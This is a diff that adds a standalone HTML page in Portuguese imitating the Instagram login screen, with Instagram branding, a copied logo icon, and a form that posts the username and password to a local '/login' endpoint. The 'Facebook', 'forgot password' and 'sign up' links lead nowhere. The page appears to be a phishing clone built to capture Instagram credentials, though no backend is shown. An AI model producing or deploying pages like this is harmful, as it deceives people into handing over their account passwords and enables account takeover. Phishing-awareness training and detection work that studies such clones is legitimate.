@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Instagram</title>
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'><radialGradient id='ig' cx='19.38' cy='42.04' r='44.9'><stop offset='0' stop-color='%23fd5'/><stop offset='.328' stop-color='%23ff543f'/><stop offset='.348' stop-color='%23fc5245'/><stop offset='.504' stop-color='%23e64771'/><stop offset='.643' stop-color='%23d53e91'/><stop offset='.761' stop-color='%23cc39a4'/><stop offset='.841' stop-color='%23c837ab'/></radialGradient><path fill='url(%23ig)' d='M34.017 41.99l-20 .019c-4.4.004-8.003-3.592-8.008-7.992l-.019-20c-.004-4.4 3.592-8.003 7.992-8.008l20-.019c4.4-.004 8.003 3.592 8.008 7.992l.019 20c.005 4.401-3.592 8.004-7.992 8.008z'/><path fill='%23fff' d='M24 31c-3.859 0-7-3.14-7-7s3.141-7 7-7 7 3.14 7 7-3.141 7-7 7zm0-11.5c-2.481 0-4.5 2.019-4.5 4.5s2.019 4.5 4.5 4.5 4.5-2.019 4.5-4.5-2.019-4.5-4.5-4.5zM32.25 16.75c0 .69-.56 1.25-1.25 1.25s-1.25-.56-1.25-1.25.56-1.25 1.25-1.25 1.25.56 1.25 1.25zM24 12c-3.259 0-3.668.014-4.948.072-1.277.058-2.149.264-2.912.563-.79.306-1.459.717-2.126 1.384S12.94 15.62 12.635 16.41c-.3.763-.505 1.635-.563 2.912C12.014 20.332 12 20.741 12 24s.014 3.668.072 4.948c.058 1.277.264 2.149.563 2.912.306.79.717 1.459 1.384 2.126.667.666 1.336 1.079 2.126 1.384.763.3 1.635.505 2.912.563C20.332 35.986 20.741 36 24 36s3.668-.014 4.948-.072c1.277-.058 2.149-.264 2.912-.563.79-.306 1.459-.717 2.126-1.384.666-.667 1.079-1.336 1.384-2.126.3-.763.505-1.635.563-2.912C35.986 27.668 36 27.259 36 24s-.014-3.668-.072-4.948c-.058-1.277-.264-2.149-.563-2.912-.306-.79-.717-1.459-1.384-2.126-.667-.666-1.336-1.079-2.126-1.384-.763-.3-1.635-.505-2.912-.563C27.668 12.014 27.259 12 24 12zm0 2.16c3.203 0 3.585.016 4.85.071 1.17.055 1.805.249 2.227.415.562.217.96.477 1.382.896.419.42.679.819.896 1.381.164.422.36 1.057.413 2.227.057 1.266.07 1.646.07 4.85s-.015 3.585-.074 4.85c-.061 1.17-.256 1.805-.421 2.227-.224.562-.479.96-.899 1.382-.419.419-.824.679-1.38.896-.42.164-1.065.36-2.235.413-1.274.057-1.649.07-4.859.07-3.211 0-3.586-.015-4.859-.074-1.171-.061-1.816-.256-2.236-.421-.569-.224-.96-.479-1.379-.899-.421-.419-.69-.824-.9-1.38-.165-.42-.359-1.065-.42-2.235-.045-1.26-.061-1.649-.061-4.844 0-3.196.016-3.586.061-4.861.061-1.17.255-1.814.42-2.234.21-.57.479-.96.9-1.381.419-.419.81-.689 1.379-.898.42-.166 1.051-.361 2.221-.421 1.275-.045 1.65-.06 4.859-.06l.045.03zm0 3.678c-4.097 0-7.42 3.322-7.42 7.42 0 4.097 3.323 7.42 7.42 7.42 4.097 0 7.42-3.323 7.42-7.42 0-4.098-3.323-7.42-7.42-7.42zM24 29c-2.761 0-5-2.239-5-5s2.239-5 5-5 5 2.239 5 5-2.239 5-5 5zm6.5-11.957c0 .995-.806 1.8-1.8 1.8-.995 0-1.8-.805-1.8-1.8 0-.994.805-1.8 1.8-1.8.994 0 1.8.806 1.8 1.8z'/></svg>" />
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      background: #fafafa;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      padding: 20px;
+    }
+    
+    .container {
+      max-width: 350px;
+      width: 100%;
+    }
+    
+    .card {
+      background: #fff;
+      border: 1px solid #dbdbdb;
+      border-radius: 1px;
+      padding: 40px 40px 20px;
+      margin-bottom: 10px;
+    }
+    
+    .logo {
+      text-align: center;
+      margin-bottom: 30px;
+    }
+    
+    .logo h1 {
+      font-family: "Cookie", cursive;
+      font-size: 48px;
+      font-weight: normal;
+      color: #262626;
+    }
+    
+    input {
+      width: 100%;
+      padding: 9px 8px;
+      font-size: 14px;
+      background: #fafafa;
+      border: 1px solid #dbdbdb;
+      border-radius: 3px;
+      margin-bottom: 8px;
+      outline: none;
+    }
+    
+    input:focus {
+      border-color: #a8a8a8;
+    }
+    
+    button {
+      width: 100%;
+      padding: 7px 16px;
+      background: #0095f6;
+      color: #fff;
+      font-size: 14px;
+      font-weight: 600;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      margin-top: 8px;
+    }
+    
+    button:hover {
+      background: #1877f2;
+    }
+    
+    .divider {
+      display: flex;
+      align-items: center;
+      margin: 20px 0;
+      color: #8e8e8e;
+      font-size: 13px;
+      font-weight: 600;
+    }
+    
+    .divider::before,
+    .divider::after {
+      content: "";
+      flex: 1;
+      border-bottom: 1px solid #dbdbdb;
+    }
+    
+    .divider:not(:empty)::before {
+      margin-right: 18px;
+    }
+    
+    .divider:not(:empty)::after {
+      margin-left: 18px;
+    }
+    
+    .facebook-login {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+    
+    .facebook-login a {
+      color: #385185;
+      text-decoration: none;
+      font-size: 14px;
+      font-weight: 600;
+    }
+    
+    .forgot {
+      text-align: center;
+      margin-top: 12px;
+    }
+    
+    .forgot a {
+      color: #00376b;
+      text-decoration: none;
+      font-size: 12px;
+    }
+    
+    .signup {
+      background: #fff;
+      border: 1px solid #dbdbdb;
+      border-radius: 1px;
+      padding: 20px;
+      text-align: center;
+      font-size: 14px;
+    }
+    
+    .signup a {
+      color: #0095f6;
+      text-decoration: none;
+      font-weight: 600;
+    }
+    
+    @media (max-width: 450px) {
+      .card {
+        border: none;
+        padding: 20px;
+      }
+      
+      .signup {
+        border: none;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="card">
+      <div class="logo">
+        <h1 style="font-family: 'Brush Script MT', cursive;">Instagram</h1>
+      </div>
+      
+      <form method="POST" action="/login">
+        <input type="text" name="username" placeholder="Número de telefone, nome de utilizador ou email" required />
+        <input type="password" name="password" placeholder="Palavra-passe" required />
+        <button type="submit">Entrar</button>
+      </form>
+      
+      <div class="divider">OU</div>
+      
+      <div class="facebook-login">
+        <a href="#">📘 Entrar com o Facebook</a>
+      </div>
+      
+      <div class="forgot">
+        <a href="#">Esqueceste-te da palavra-passe?</a>
+      </div>
+    </div>
+    
+    <div class="signup">
+      Não tens uma conta? <a href="#">Regista-te</a>
+    </div>
+  </div>
+</body>
+</html>
